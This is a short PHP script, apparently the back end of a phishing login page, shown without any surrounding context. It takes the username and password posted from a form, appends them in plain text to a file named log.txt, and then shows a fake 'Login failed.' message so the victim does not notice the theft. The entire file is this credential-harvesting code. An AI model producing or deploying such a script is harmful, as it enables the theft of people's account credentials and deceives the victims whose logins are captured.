<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
file_put_contents("log.txt", "USER: $user PASS: $pass\n", FILE_APPEND);
echo "Login failed.";
?>
